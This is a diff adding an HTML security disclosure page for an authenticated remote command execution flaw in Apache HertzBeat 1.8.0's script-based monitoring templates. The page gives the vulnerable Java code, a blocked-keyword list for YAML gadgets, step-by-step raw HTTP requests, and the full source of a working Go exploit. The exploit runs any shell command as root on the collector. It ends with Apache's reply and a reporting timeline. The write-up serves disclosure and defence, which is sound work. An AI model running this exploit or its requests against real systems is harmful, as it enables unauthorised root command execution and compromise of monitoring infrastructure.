@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apache HertzBeat (v1.8.0) ScriptCollectImpl RCE</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      line-height: 1.6;
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 2rem;
+      color: #333;
+    }
+    h1 { font-size: 1.75rem; margin-top: 0; border-bottom: 2px solid #333; padding-bottom: 0.5rem; }
+    h2 { font-size: 1.35rem; margin-top: 2rem; }
+    h3 { font-size: 1.15rem; margin-top: 1.5rem; }
+    pre, code {
+      font-family: 'SF Mono', Monaco, 'Consolas', 'Liberation Mono', monospace;
+      font-size: 0.9rem;
+    }
+    pre {
+      background: #f5f5f5;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 1rem;
+      overflow-x: auto;
+      white-space: pre;
+      margin: 1rem 0;
+    }
+    code { padding: 0.2em 0.4em; background: #f0f0f0; border-radius: 3px; }
+    pre code { padding: 0; background: none; }
+    blockquote {
+      margin: 1rem 0;
+      padding: 1rem 1.5rem;
+      background: #f9f9f9;
+      border-left: 4px solid #666;
+      font-style: italic;
+    }
+    a { color: #0066cc; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    hr { margin: 2rem 0; border: none; border-top: 1px solid #ccc; }
+    ul { margin: 0.5rem 0; padding-left: 1.5rem; }
+  </style>
+</head>
+<body>
+
+<h1>Apache HertzBeat (v1.8.0) ScriptCollectImpl RCE</h1>
+
+<p><strong>Severity:</strong> CRITICAL<br>
+<strong>Impact:</strong> Arbitrary Command Execution in Monitoring Template<br>
+<strong>CWE:</strong> CWE-78 (Improper Neutralization of Special Elements used in an OS Command)<br>
+<strong>Product:</strong> <a href="https://hertzbeat.apache.org/">https://hertzbeat.apache.org/</a> (v1.8.0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- HertzBeat is an AI-powered Open Source Observability System<br>
+<strong>Affected Component:</strong> <code>ScriptCollectImpl.collect()</code><br>
+<strong>Affected Endpoint:</strong> <code>PUT /api/apps/define/yml</code><br>
+<strong>Auth Required:</strong> standard user or admin<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- For testing purposes, add a new standard user called <code>operator</code> with <code>hertzbeat</code> for the password.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- Alternatively, use the <code>admin</code> user, with the default <code>hertzbeat</code> password.<br>
+<strong>Apache Response:</strong> Apache does not consider this a vulnerability; see <a href="#response-from-apache">Response from Apache</a> below.</p>
+
+<p><strong>Author:</strong> Brett Gervasoni<br>
+<strong>Date:</strong> 2026-03-09</p>
+
+<hr>
+
+<h2>Vulnerability Summary</h2>
+
+<p>Hertzbeat has a design flaw that allows for arbitrary commands to be executed via the <code>scriptCommand</code> parameter in a template definition.</p>
+
+<p>An authenticated user can overwrite any monitoring template definition via <code>PUT /api/apps/define/yml</code>. The <code>define</code> parameter of the PUT request contains raw YAML that is parsed into a <code>Job</code> object. When the YAML specifies <code>protocol: script</code>, the attacker-controlled <code>scriptCommand</code> string is passed directly to <code>ProcessBuilder</code> (<code>bash -c "&lt;command&gt;"</code>) with no sanitization.</p>
+
+<p>If the overwritten template has active monitoring instances, <code>updateAppCollectJob()</code> re-dispatches them, triggering command execution on the collector within seconds. If no instances exist, the attacker can create one via <code>POST /api/monitor</code>, which will cause the template to execute immediately.</p>
+
+<p>The container runs as <strong>root</strong> (<code>uid=0</code>).</p>
+
+<p>This vulnerability can be exploited by a standard user and an admin user. In the example HTTP request and exploit program, I use a new standard user I created called <code>operator</code>.</p>
+
+<hr>
+
+<h2>Vulnerable Code</h2>
+
+<p><strong>Sink — <code>ScriptCollectImpl.java:74-114</code></strong> — No whitelist/blacklist, direct command execution:</p>
+
+<pre><code>public void collect(CollectRep.MetricsData.Builder builder, Metrics metrics) {
+    ScriptProtocol scriptProtocol = metrics.getScript();
+    // ...
+    if (StringUtils.hasText(scriptProtocol.getScriptCommand())) {
+        switch (scriptProtocol.getScriptTool()) {
+            case BASH -&gt; processBuilder = new ProcessBuilder(
+                BASH, BASH_C, scriptProtocol.getScriptCommand().trim());  // ← PAYLOAD
+            // ...
+        }
+    }
+    // ...
+    Process process = processBuilder.start();  // ← EXECUTED
+}</code></pre>
+
+<p><strong>Blocks Common Deserialization Gadget Strings — <code>AppController.java:55-59</code></strong> — Blocks SnakeYAML gadgets, not shell commands:</p>
+
+<pre><code>private static final String[] RISKY_STR_ARR = {"ScriptEngineManager", "URLClassLoader", "!!",
+        "ClassLoader", "AnnotationConfigApplicationContext", "FileSystemXmlApplicationContext",
+        "GenericXmlApplicationContext", "GenericGroovyApplicationContext", "GroovyScriptEngine",
+        "GroovyClassLoader", "GroovyShell", "ScriptEngine", "ScriptEngineFactory",
+        "XmlWebApplicationContext", "ClassPathXmlApplicationContext", "MarshalOutputStream",
+        "InflaterOutputStream", "FileOutputStream"};
+}</code></pre>
+
+<hr>
+
+<h2>Proof of Concept — Raw HTTP Requests</h2>
+
+<p>Replace <code>TARGET</code> with the HertzBeat host. These requests use a default <code>operator</code> account (<code>user</code> role).</p>
+
+<h3>Step 1 — Authenticate</h3>
+
+<p>In this instance, I've added a new standard user with the name <code>operator</code> and password <code>hertzbeat</code>, so I'm not using an admin account.</p>
+
+<pre><code>POST /api/account/auth/form HTTP/1.1
+Host: TARGET:1157
+Content-Type: application/json
+Content-Length: 65
+
+{"type":1,"identifier":"operator","credential":"hertzbeat"}</code></pre>
+
+<p>Response contains <code>data.token</code> (JWT). Used as <code>Bearer</code> token below.</p>
+
+<hr>
+
+<h3>Step 2 — Overwrite <code>linux_script</code> template with malicious <code>scriptCommand</code></h3>
+
+<p>This overwrites the built-in <code>linux_script</code> monitoring definition. The <code>scriptCommand</code> field contains
+the attacker's payload. Any active <code>linux_script</code> monitors will immediately execute it.</p>
+
+<pre><code>PUT /api/apps/define/yml HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer eyJhbGciOiJIUzUxMiIsInppcC...
+Content-Type: application/json
+
+{"define":"app: linux_script\ncategory: os\nname:\n  en-US: Linux Script\n  zh-CN: Linux Script\nparams:\n  - field: host\n    name:\n      en-US: Host\n      zh-CN: Host\n    type: host\n    required: true\nmetrics:\n  - name: basic\n    i18n:\n      en-US: Basic\n      zh-CN: Basic\n    priority: 0\n    fields:\n      - field: result\n        type: 1\n        i18n:\n          en-US: Result\n          zh-CN: Result\n    protocol: script\n    script:\n      scriptTool: bash\n      charset: UTF-8\n      scriptCommand: id &gt; /tmp/pwned\n      parseType: multiRow\n"}</code></pre>
+
+<p><strong>Decoded <code>define</code> value (the YAML that gets parsed server-side):</strong></p>
+
+<pre><code>app: linux_script
+category: os
+name:
+  en-US: Linux Script
+  zh-CN: Linux Script
+params:
+  - field: host
+    name:
+      en-US: Host
+      zh-CN: Host
+    type: host
+    required: true
+metrics:
+  - name: basic
+    i18n:
+      en-US: Basic
+      zh-CN: Basic
+    priority: 0
+    fields:
+      - field: result
+        type: 1
+        i18n:
+          en-US: Result
+          zh-CN: Result
+    protocol: script
+    script:
+      scriptTool: bash
+      charset: UTF-8
+      scriptCommand: id &gt; /tmp/pwned
+      parseType: multiRow</code></pre>
+
+<p><strong>Expected Response:</strong></p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"msg":null,"data":null}</code></pre>
+
+<p>At this point, if any <code>linux_script</code> monitors are active, the command <code>id &gt; /tmp/pwned</code> executes promptly (within ~30 seconds)
+If no monitors exist, we need to create one.</p>
+
+<hr>
+
+<h3>Step 3 — Create a monitoring instance to trigger execution (if one is not already present)</h3>
+
+<p>Only needed if no <code>linux_script</code> monitors are active. Creating a new monitor instance will cause the template with our command to execute immediately.</p>
+
+<pre><code>POST /api/monitor HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer eyJhbGciOiJIUzUxMiIsInppcC...
+Content-Type: application/json
+
+{"monitor":{"name":"rce-test","app":"linux_script","host":"127.0.0.1","intervals":30,"status":1},"params":[{"field":"host","paramValue":"127.0.0.1","type":1}]}</code></pre>
+
+<p>The collector immediately executes the <code>scriptCommand</code> from the template injected in Step 2.</p>
+
+<hr>
+
+<h3>Step 4 — Verify command execution</h3>
+
+<p>Assuming your test instance is running in docker, you can simply check like so:</p>
+
+<pre><code>docker exec hertzbeat cat /tmp/pwned</code></pre>
+
+<p>Expected output:</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+<hr>
+
+<h3>Exploit Program PoC</h3>
+
+<p>Sample output from the poc script.</p>
+
+<pre><code>❯ go run script_command_rce.go "id &gt; /tmp/pwned"
+============================================================
+ HertzBeat ScriptCollectImpl RCE
+============================================================
+
+[*] Authenticating...
+[+] Got token: eyJhbGciOiJIUzUxMiIsInppcCI6IkRFRiJ9.eJw...
+
+[*] Overwriting linux_script template...
+    PUT /api/apps/define/yml
+    scriptCommand: id &gt; /tmp/pwned
+[+] Template overwritten.
+
+[*] Creating monitor instance to trigger collection...
+    POST /api/monitor with app: linux_script
+[+] Monitor created.
+
+[+] Completed. If it wasn't executed instantly, wait ~30 seconds for the collector.
+[+] Command: id &gt; /tmp/pwned
+
+[*] Verify with (assuming its running in docker locally):
+    docker exec hertzbeat &lt;check your payload&gt;
+❯ docker exec hertzbeat cat /tmp/pwned
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+<h2>Exploit Code</h2>
+
+<p>Full source of <code>script_command_rce.go</code>:</p>
+
+<pre><code>package main
+
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io"
+	"math/rand"
+	"net/http"
+	"os"
+	"strings"
+)
+
+const target = "http://localhost:1157"
+
+type authResponse struct {
+	Code int `json:"code"`
+	Data struct {
+		Token string `json:"token"`
+	} `json:"data"`
+}
+
+type apiResponse struct {
+	Code int    `json:"code"`
+	Msg  string `json:"msg"`
+}
+
+func main() {
+	if len(os.Args) &lt; 2 {
+		fmt.Fprintf(os.Stderr, "Usage: %s &lt;command&gt;\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "Example: %s \"id &gt; /tmp/pwned\"\n", os.Args[0])
+		os.Exit(1)
+	}
+	cmd := strings.Join(os.Args[1:], " ")
+
+	fmt.Println("============================================================")
+	fmt.Println(" HertzBeat ScriptCollectImpl RCE")
+	fmt.Println("============================================================")
+	fmt.Println()
+
+	// Authenticate as operator (using a user role that I created, you can use admin if you want)
+	fmt.Println("[*] Authenticating...")
+
+	token, err := authenticate()
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Auth failed: %v\n", err)
+		os.Exit(1)
+	}
+
+	fmt.Printf("[+] Got token: %s...\n\n", token[:40])
+
+	// Overwrite linux_script template with malicious scriptCommand
+	fmt.Println("[*] Overwriting linux_script template...")
+	fmt.Printf("    PUT /api/apps/define/yml\n")
+	fmt.Printf("    scriptCommand: %s\n", cmd)
+
+	err = putMaliciousDefine(token, cmd)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Failed to overwrite template: %v\n", err)
+		os.Exit(1)
+	}
+
+	fmt.Println("[+] Template overwritten.")
+	fmt.Println()
+
+	// Create a monitoring instance to trigger execution
+	fmt.Println("[*] Creating monitor instance to trigger collection...")
+	fmt.Println("    POST /api/monitor with app: linux_script")
+
+	err = createMonitor(token)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Failed to create monitor: %v\n", err)
+		fmt.Println("[*] This may fail if a monitor already exists — checking anyway...")
+	} else {
+		fmt.Println("[+] Monitor created.")
+		fmt.Println()
+	}
+
+	// Completed — command will execute on next collection cycle
+	fmt.Println("[+] Completed. If it wasn't executed instantly, wait ~30 seconds for the collector.")
+	fmt.Printf("[+] Command: %s\n\n", cmd)
+	fmt.Println("[*] Verify with (assuming its running in docker locally):")
+	fmt.Println("    docker exec hertzbeat &lt;check your payload&gt;")
+}
+
+// authenticate logs in as a standard user role that I created called "operator"
+func authenticate() (string, error) {
+	body := `{"type":1,"identifier":"operator","credential":"hertzbeat"}`
+
+	resp, err := http.Post(target+"/api/account/auth/form", "application/json", bytes.NewBufferString(body))
+	if err != nil {
+		return "", err
+	}
+
+	defer resp.Body.Close()
+
+	var result authResponse
+	if err := json.NewDecoder(resp.Body).Decode(&amp;result); err != nil {
+		return "", err
+	}
+
+	if result.Code != 0 || result.Data.Token == "" {
+		return "", fmt.Errorf("unexpected response code %d", result.Code)
+	}
+
+	return result.Data.Token, nil
+}
+
+// putMaliciousDefine overwrites the linux_script app definition with a
+// script-protocol template containing the attacker's command.
+func putMaliciousDefine(token, command string) error {
+	define := fmt.Sprintf(`app: linux_script
+category: os
+name:
+  en-US: Linux Script
+  zh-CN: Linux Script
+params:
+  - field: host
+    name:
+      en-US: Host
+      zh-CN: Host
+    type: host
+    required: true
+metrics:
+  - name: basic
+    i18n:
+      en-US: Basic
+      zh-CN: Basic
+    priority: 0
+    fields:
+      - field: result
+        type: 1
+        i18n:
+          en-US: Result
+          zh-CN: Result
+    protocol: script
+    script:
+      scriptTool: bash
+      charset: UTF-8
+      scriptCommand: "%s &amp;&amp; echo result done"
+      parseType: multiRow
+`, command)
+
+	payload, _ := json.Marshal(map[string]string{"define": define})
+
+	req, _ := http.NewRequest("PUT", target+"/api/apps/define/yml", bytes.NewBuffer(payload))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+token)
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+
+	var result apiResponse
+	if err := json.Unmarshal(respBody, &amp;result); err != nil {
+		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+
+	if result.Code != 0 {
+		return fmt.Errorf("API error (code %d): %s", result.Code, result.Msg)
+	}
+
+	return nil
+}
+
+// createMonitor creates a linux_script monitoring instance pointed at localhost.
+// Uses a random suffix so the name is unique on repeated runs.
+func createMonitor(token string) error {
+	suffix := randSuffix()
+	name := fmt.Sprintf("rce-poc-%s", suffix) // creating a unique suffix, so the command is executed instantly, instead of potentially waiting.
+	body := fmt.Sprintf(`{"monitor":{"name":"%s","app":"linux_script","host":"127.0.0.1","intervals":30,"status":1},"params":[{"field":"host","paramValue":"127.0.0.1","type":1}]}`, name)
+
+	req, _ := http.NewRequest("POST", target+"/api/monitor", bytes.NewBufferString(body))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+token)
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+	var result apiResponse
+	if err := json.Unmarshal(respBody, &amp;result); err != nil {
+		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+
+	if result.Code != 0 {
+		return fmt.Errorf("API error (code %d): %s", result.Code, result.Msg)
+	}
+	return nil
+}
+
+func randSuffix() string {
+	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, 8)
+
+	for i := range b {
+		b[i] = chars[rand.Intn(len(chars))]
+	}
+
+	return string(b)
+}</code></pre>
+
+<h2>Notes</h2>
+
+<ul>
+  <li>The <code>operator:hertzbeat</code> default account (<code>user</code> role) is sufficient. No <code>admin</code> required.</li>
+  <li>A new custom app name (e.g., <code>app: rce_custom</code>) can be used with <code>POST</code> instead of <code>PUT</code> to avoid
+    modifying existing definitions — the attacker just needs to then create a monitor for it.</li>
+</ul>
+
+<hr>
+
+<h2 id="response-from-apache">Response from Apache</h2>
+
+<p>Official response from Apache Security Team:</p>
+
+<blockquote>As documented in HertzBeat's security model at <a href="https://hertzbeat.apache.org/docs/help/security_model/">https://hertzbeat.apache.org/docs/help/security_model</a>, this is expected, intended functionality: it is up to the operator to make sure only trusted users are given access to HertzBeat. Customization is a feature, and users are responsible for their own custom templates. It's expected that any authenticated user is trusted with admin capabilities.</blockquote>
+
+<p>The permission model in HertzBeat has not been finished yet, though the product has shipped. See the <a href="https://hertzbeat.apache.org/docs/help/security_model/">HertzBeat Security Model</a> documentation for details.</p>
+
+<p>This is what Apache had to say about role-based permissions:</p>
+
+<blockquote>Please note that the role permission function is being improved, please do not use roles to control user permissions, all users have management permissions</blockquote>
+
+<h3>Reporting Timeline</h3>
+
+<ul>
+  <li><strong>Feb 19, 2026:</strong> Reported to Apache Security</li>
+  <li><strong>Feb 19 – March 4:</strong> Deliberations on whether or not to classify any security vulnerabilities post auth as a vulnerability.</li>
+  <li><strong>March 4:</strong> Discussion concluded. Apache does not consider post auth vulnerabilities in HertzBeat to be a vulnerability, and rather the user must accept this risk.</li>
+  <li><strong>March 9:</strong> Public release.</li>
+</ul>
+
+</body>
+</html>
